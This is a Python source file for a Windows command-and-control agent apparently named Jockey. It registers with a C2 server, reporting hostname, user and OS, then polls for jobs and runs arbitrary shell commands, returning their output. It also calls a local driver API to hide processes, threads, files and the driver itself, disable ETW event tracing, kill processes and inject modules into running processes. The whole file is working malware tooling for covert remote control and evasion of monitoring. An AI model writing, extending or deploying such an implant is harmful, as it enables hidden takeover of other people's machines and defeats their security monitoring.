"""
Jockey Windows Agent
- Connects to the Linux C2 server (same protocol as agent_sim.py)
- Forwards shell commands locally via subprocess
- Forwards stealth/module commands to the local windows_server.py
"""
import os
import sys
import time
import uuid
import socket
import platform
import subprocess
import requests
import hashlib
import logging
import tempfile
import json
from pathlib import Path
from urllib.parse import urljoin

# ---------------------------------------------------------------------------
# config
# ---------------------------------------------------------------------------

C2_URL      = os.environ.get("C2_URL",      "http://127.0.0.1:8080")
C2_AGENT_KEY = os.environ.get("C2_AGENT_KEY", "changeme-agent-key")
C2_ID       = os.environ.get("C2_ID",       "")
WIN_SRV     = os.environ.get("WIN_SRV",     "http://127.0.0.1:9090")
WIN_TOKEN   = os.environ.get("WIN_TOKEN",   "")  # read from server log if unknown
BEACON_SEC  = int(os.environ.get("BEACON_SEC", "25"))
CMD_TIMEOUT = int(os.environ.get("CMD_TIMEOUT", "30"))

HEADERS = {"X-Agent-Key": C2_AGENT_KEY, "Content-Type": "application/json"}

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [agent] %(message)s",
)
log = logging.getLogger("agent")

# ---------------------------------------------------------------------------
# local helpers
# ---------------------------------------------------------------------------

def win_auth_headers() -> dict:
    h = {"Content-Type": "application/json"}
    if WIN_TOKEN:
        h["Authorization"] = f"Bearer {WIN_TOKEN}"
    return h

def call_win(method: str, path: str, body: dict | None = None) -> tuple[bool, str]:
    """Call the local windows_server API, return (ok, output)."""
    url = urljoin(WIN_SRV, path)
    try:
        if method == "GET":
            r = requests.get(url, headers=win_auth_headers(), timeout=15)
        elif method == "POST":
            r = requests.post(url, headers=win_auth_headers(),
                              json=body or {}, timeout=15)
        elif method == "DELETE":
            r = requests.delete(url, headers=win_auth_headers(), timeout=15)
        else:
            return False, f"unknown method {method}"
        return r.ok, r.text[:4096]
    except requests.exceptions.ConnectionError:
        return False, "[win-server not reachable — start windows_server.py first]"
    except requests.exceptions.Timeout:
        return False, "[win-server timeout]"
    except Exception as e:
        return False, f"[win-server error] {e}"

# ---------------------------------------------------------------------------
# command router
# ---------------------------------------------------------------------------

# Supported stealth commands:  stealth:<action> [args...]
# e.g.  stealth:hide_pid 4
#       stealth:unhide_file C:\Windows\System32\notepad.exe
#       stealth:disable_etw
#       stealth:hide_thread 1234
#       stealth:kill 5678

_STEALTH_MAP = {
    "hide_pid":    ("GET",  "/api/driver/hide_pid/{arg}"),
    "unhide_pid":  ("GET",  "/api/driver/unhide_pid/{arg}"),
    "hide_thread": ("GET",  "/api/driver/thread/{arg}"),
    "kill":        ("GET",  "/api/driver/kill/{arg}"),
    "etw":         ("GET",  "/api/driver/etw"),
    "driver_hide": ("GET",  "/api/driver/driver_hide"),
    "ping":        ("GET",  "/api/driver/ping"),
    "status":      ("GET",  "/api/status"),
}

_MODULE_MAP = {
    "modules_list":  ("GET",  "/api/modules"),
    "module_add":    ("POST", "/api/modules/add"),
    "module_del":    ("DELETE","/api/modules/{arg}"),
}

_INJECT_MAP = {
    "inject": ("POST", "/api/inject/{arg}"),  # arg = pid, body needs module_id
}


def _resolve_path(cmd: str, arg: str) -> str:
    """Expand relative paths to absolute on Windows."""
    if os.path.isabs(arg):
        return arg
    # try CWD, then TEMP
    for base in [os.getcwd(), tempfile.gettempdir()]:
        candidate = os.path.join(base, arg)
        if os.path.exists(candidate):
            return candidate
    return arg


def handle_command(raw: str) -> str:
    """Route a command string and return output."""
    raw = raw.strip()
    if not raw:
        return "(empty)"

    # --- stealth commands ---
    if raw.startswith("stealth:"):
        parts = raw[8:].split(None, 1)
        action = parts[0]
        arg = parts[1] if len(parts) > 1 else ""

        if action in _STEALTH_MAP:
            method, tmpl = _STEALTH_MAP[action]
            path = tmpl.format(arg=arg) if "{arg}" in tmpl else tmpl
            ok, out = call_win(method, path)
            return f"[stealth:{action}] {'OK' if ok else 'FAIL'}\n{out}"

        if action == "hide_file" and arg:
            path = _resolve_path("", arg)
            ok, out = call_win("POST", "/api/driver/hide_file", {"path": path})
            return f"[stealth:hide_file {path}] {'OK' if ok else 'FAIL'}\n{out}"
        if action == "unhide_file" and arg:
            path = _resolve_path("", arg)
            ok, out = call_win("POST", "/api/driver/unhide_file", {"path": path})
            return f"[stealth:unhide_file {path}] {'OK' if ok else 'FAIL'}\n{out}"

        return f"[stealth] unknown action: {action}"

    # --- module commands ---
    if raw.startswith("module:"):
        parts = raw[7:].split(None, 1)
        action = parts[0]
        arg = parts[1] if len(parts) > 1 else ""

        if action == "list":
            ok, out = call_win("GET", "/api/modules")
            return f"[modules]\n{out}"
        if action == "add" and arg:
            src = _resolve_path("", arg)
            ok, out = call_win("POST", "/api/modules/add",
                               {"path": src, "name": os.path.basename(src)})
            return f"[module:add {src}] {'OK' if ok else 'FAIL'}\n{out}"
        if action == "del" and arg:
            ok, out = call_win("DELETE", f"/api/modules/{arg}")
            return f"[module:del {arg}] {'OK' if ok else 'FAIL'}\n{out}"
        return f"[module] unknown action: {action}"

    # --- inject: pid <module_id> ---
    if raw.startswith("inject:"):
        parts = raw[7:].split()
        if len(parts) < 2:
            return "[inject] usage: inject:<pid> <module_id>"
        pid, mid = parts[0], parts[1]
        ok, out = call_win("POST", f"/api/inject/{pid}", {"module_id": mid})
        return f"[inject pid={pid} mod={mid}] {'OK' if ok else 'FAIL'}\n{out}"

    # --- plain shell command ---
    try:
        r = subprocess.run(
            raw, shell=True, capture_output=True, text=True, timeout=CMD_TIMEOUT
        )
        out = r.stdout
        if r.stderr:
            out += ("\n" if out else "") + "[stderr]\n" + r.stderr
        if r.returncode != 0:
            out += f"\n[exit {r.returncode}]"
        return out or "(no output)"
    except subprocess.TimeoutExpired:
        return "[timeout]"
    except Exception as e:
        return f"[error] {e}"


# ---------------------------------------------------------------------------
# C2 protocol
# ---------------------------------------------------------------------------

def checkin() -> str:
    info = {
        "id":       C2_ID or None,
        "hostname": socket.gethostname(),
        "user":     os.environ.get("USERNAME", ""),
        "os":       f"{platform.system()} {platform.release()}",
        "arch":     platform.machine(),
        "pid":      os.getpid(),
    }
    r = requests.post(f"{C2_URL}/agent/checkin", json=info,
                      headers=HEADERS, timeout=15)
    r.raise_for_status()
    aid = r.json()["id"]
    log.info("checked in as %s", aid)
    return aid


def beacon(aid: str):
    r = requests.get(f"{C2_URL}/agent/beacon/{aid}", headers=HEADERS, timeout=BEACON_SEC + 10)
    if r.status_code == 204:
        return None
    r.raise_for_status()
    return r.json()


def submit(aid: str, cmd_id, output: str):
    try:
        requests.post(
            f"{C2_URL}/agent/result/{aid}",
            json={"cmd_id": cmd_id, "result": output[:65536]},
            headers=HEADERS, timeout=10,
        )
    except Exception as e:
        log.warning("submit failed: %s", e)


# ---------------------------------------------------------------------------
# main loop
# ---------------------------------------------------------------------------

def main():
    log.info("C2  : %s", C2_URL)
    log.info("WinSrv: %s", WIN_SRV)
    if WIN_TOKEN:
        log.info("WinToken: %s...", WIN_TOKEN[:8])
    else:
        log.warning("WIN_TOKEN not set — stealth commands will fail auth")

    aid = checkin()
    log.info("beaconing every %ds", BEACON_SEC)

    while True:
        try:
            job = beacon(aid)
            if not job:
                continue
            cid = job["cmd_id"]
            cmd = job["cmd"]
            log.info("cmd #%d: %s", cid, cmd[:80])
            result = handle_command(cmd)
            submit(aid, cid, result)
        except requests.exceptions.RequestException as e:
            log.warning("network error: %s", e)
            time.sleep(5)
        except KeyboardInterrupt:
            break
        except Exception as e:
            log.error("unhandled: %s", e, exc_info=True)
            time.sleep(1)

    log.info("agent exiting")


if __name__ == "__main__":
    main()
